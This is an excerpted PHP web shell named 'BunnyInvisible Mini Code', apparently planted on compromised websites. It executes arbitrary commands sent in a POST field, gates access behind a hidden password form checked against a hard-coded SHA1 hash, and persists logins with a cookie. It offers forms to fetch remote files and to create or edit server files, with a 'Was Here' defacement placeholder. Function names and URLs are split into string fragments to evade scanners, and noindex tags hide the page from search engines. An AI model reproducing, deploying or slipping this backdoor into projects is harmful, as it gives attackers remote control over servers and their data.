...
function BunnyCmd($komendnya) {
    ...
    if ( $func_exist( $proc ) ) {
        ...
        return "<b> Disable Function! </b>";
    }
}
if (isset($_POST['BunnymanCode'])) {
    $komendnya = $_POST['BunnymanCode'];
    echo BunnyCmd($komendnya);
}
//BunnyInvisible Config
$Bunny_Mini = "B"."un"."ny"."In"."vi"."si"."bl"."e Mi"."ni Co"."de";
$Bunny_Logo = "ht"."tp"."s:/"."/i".".i"."bb".".c"."o/"."qC"."6R"."wF"."0/"."lo"."go"."-"."bunny404."."p"."n"."g";
$Bunny_Icons = "h"."t"."t"."ps"."://"."i."."ib"."b."."co"."/Y"."Pd"."7d"."3D"."/i"."co"."ns-"."bunny404".".j"."p"."g";
function BunnyCwd(){
    $cw = "ge"."tc"."wd";
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $d_name = 'd'.'ir'.'na'.'m'.'e';
...
$BunnySelf = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
$my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
if (isset($_POST['BingBunny'])) {
    if (SHA1($_POST['FloBunny']) == $BunnySelf) {
        echo "<s"."cr"."ip"."t>"."al"."er"."t("."' " . "Lo" . "gi" . "n " . "Su" . "cc" . "es" . "sf" . "ul" . "ly" . ", " . "Yo" . "u " . "Pr" . "o!" . "!" . " '".");"."</"."sc"."ri"."pt".">";
        $_SESSION["CocoBunny"] = "CocoBunny";
        setcookie('AyoBunny', $my_self, time() + 3600 * 24);
    } else {
...
if (isset($_GET['logout'])) {
    ...
    session_unset();
    session_destroy();
    setcookie('AyoBunny', '', time() - 3600);
    echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
    exit();
}
if (empty($_SESSION['CocoBunny'])) {
    if (empty($_COOKIE['AyoBunny'])) {
?>
...
<input type="password" name="FloBunny" style="background: #fff; border: none;">
<button type="submit" name="BingBunny" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
</form>
</div>
...
<head>
    <title>$ .:<?=$Bunny_Mini?>:. $ <?=$this_domain?></title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=1024" />
    <meta name="description" content="$ .:<?=$Bunny_Mini?>:. $" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta property="og:site_name" content="$ .:<?=$Bunny_Mini?>:. $" />
    <meta property="og:url" content="<?=$this_url?>" />
    <meta property="og:title" content="$ .:<?=$Bunny_Mini?>:. $ <?=$this_domain?>" />
    <meta property="og:description" content="$ .:<?=$Bunny_Mini?>:. $" />
...
<body>
    <header class="uk-width-1-1" style="background: var(--gray-900);">
        <div class="uk-margin-small-left">
            <div class="bunnyhy-sans uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
                <img style="width: 5vh; border-radius: 5px;" src="<?=$Bunny_Logo?>" alt="<?=$Bunny_Mini?>">
                <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$Bunny_Mini?></span>
            </div>
            <div class="bunny-awesome uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
    ...
    <div class="tools-bunny uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
            ...
            <form action="" method="POST" class="uk-width-1-2">
                <fieldset class="uk-fieldset">
                    ...
                    <div class="uk-margin-small">
                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="https://bunnyinvisible.go.id/file.txt" aria-label="Input">
            ...
            if ($toolsparam === null) {
                ...
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        ...
                        <div class="uk-margin">
                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="BunnyInvisible Was Here" aria-label="Textarea"></textarea>
                        </div>
                    </fieldset>
                </form>
                ';
            ...
            if (isset($_GET['editfile'])) {
                ...
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        ...
                        <div class="uk-margin">
                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="BunnyInvisible Was Here" aria-label="Textarea">'.$hayoloh($f_get($this_file)).'</textarea>
                        </div>
                    </fieldset>
                </form>
                ';
    ...
    <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
        <div class="footer-content uk-padding-small">
            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/BunnyInvisible404">BunnyInvisible</a></span>
        </div>
    </div>
